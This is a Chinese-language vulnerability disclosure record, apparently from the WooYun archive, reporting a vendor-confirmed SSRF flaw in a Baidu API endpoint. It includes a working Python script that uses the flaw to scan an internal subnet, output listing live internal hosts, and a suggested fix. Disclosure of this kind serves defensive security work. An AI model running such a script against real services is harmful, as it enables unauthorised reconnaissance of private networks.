{"id": 47946, "wybug_id": "wooyun-2014-084941", "wybug_title": "百度一处可探内网鸡肋SSRF(附验证脚本)", "wybug_corp": "百度", "wybug_author": "lijiejie", "wybug_date": "2014-11-27 14:30", "wybug_open_date": "2015-01-11 14:32", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-11：\t细节向公众公开  简要描述： 百度一处可探内网鸡肋SSRF(附验证脚本) 详细说明：  SSRF位于：\nhttp://tuanbai.baidu.com/apiCheckv1/?url=http://10.42.7.78\nHTTP Status 200，会返回 \n从API 获取数据不符合我们规定的XML格式！\n\n\n非200的其他情况，返回\n从API 获取数据失败!失败原因可能有：1、api所在的服务器发生故障；2、从api获取数据超时（>10s）。3、api 的url设置了redirect。\n\n\n   漏洞证明：  扫描10.42.7.1/24这个内网C段开放80,8080,8888端口HTTP服务的主机，得到：\nD:\\ssrf>baidu_ssrf.py. . .[Alive] http://10.42.7.18:80/. . . . . . .. .. . . .[Alive] http://10.42.7.24:80/. . . . . . . . . . . . . . . . . . . . .. . . .[Alive] http://10.42.7.54:80/.[Alive] http://10.42.7.57:80/. . . . . . . . . . . . . . . . . .[Alive] http://10.42.7.65:80/. . . . . . .[Alive] http://10.42.7.78:80/. . . . . . . . .[Alive] http://10.42.7.86:80/. . . . . . . . . . . .[Alive] http://10.42.7.100:80/. . .[Alive] http://10.42.7.104:80/. . . . . . . . . . . . . . . . . . . .[Alive] http://10.42.7.113:80/. . . . . . . . . . . . .[Alive] http://10.42.7.124:80/. . . . . . .[Alive] http://10.42.7.136:80/. .[Alive] http://10.42.7.139:80/. . . .[Alive] http://10.42.7.143:80/. . .[Alive] http://10.42.7.145:80/. . .[Alive] http://10.42.7.147:80/[Alive] http://10.42.7.151:80/. . .[Alive] http://10.42.7.156:80/. . .[Alive] http://10.42.7.158:80/[Alive] http://10.42.7.161:80/. . . . . . . . .[Alive] http://10.42.7.168:80/[Alive] http://10.42.7.169:80/. . . . . .[Alive] http://10.42.7.173:80/. . . . . .[Alive] http://10.42.7.187:80/. . . . . .[Alive] http://10.42.7.191:80/[Alive] http://10.42.7.192:80/. . .[Alive] http://10.42.7.196:80/. . . .[Alive] http://10.42.7.195:80/[Alive] http://10.42.7.199:80/. .[Alive] http://10.42.7.203:80/. .[Alive] http://10.42.7.206:80/. . . . . . . . .[Alive] http://10.42.7.219:80/. . . .[Alive] http://10.42.7.217:80/. . . . . .[Alive] http://10.42.7.232:80/. . . . . . . . . . . . . . . . . . . . . . . . .[Alive] http://10.42.7.156:8080/. . . . . . . All Done\n\n\npython脚本附上：\n#encoding=gbkimport httplibimport threadingimport Queuelock = threading.Lock()queue = Queue.Queue()def scan_http_service():    while True:        try:            item = queue.get(timeout=1.0)        except:            break        for i in range(3):            try:                conn = httplib.HTTPConnection('tuanbai.baidu.com', timeout=3)                url = 'http://%s:%s/' % (item['ip'], item['port'])                conn.request('GET', '/apiCheckv1/?url=' + url)                html_doc = conn.getresponse().read().decode('gbk')                conn.close()                if html_doc.find(u'从API 获取数据不符合我们规定的XML格式') >= 0:                    lock.acquire()                    print '\\n[Alive]',url                    lock.release()                    break                else:                    print '.',            except Exception, e:                passfor port in [80, 8080, 8888]:    for i in range(1, 256):            queue.put({'ip': '10.42.7.%s' % i, 'port': port})threads = []for i in range(10):    t = threading.Thread(target=scan_http_service)    t.start()    threads.append(t)for t in threads:    t.join()    print 'All Done'\n   修复方案：  对请求目标过滤   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-11-27 18:00 厂商回复： 感谢提交，已通知业务部门处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-27 16:30 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  太刁了，哈哈    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}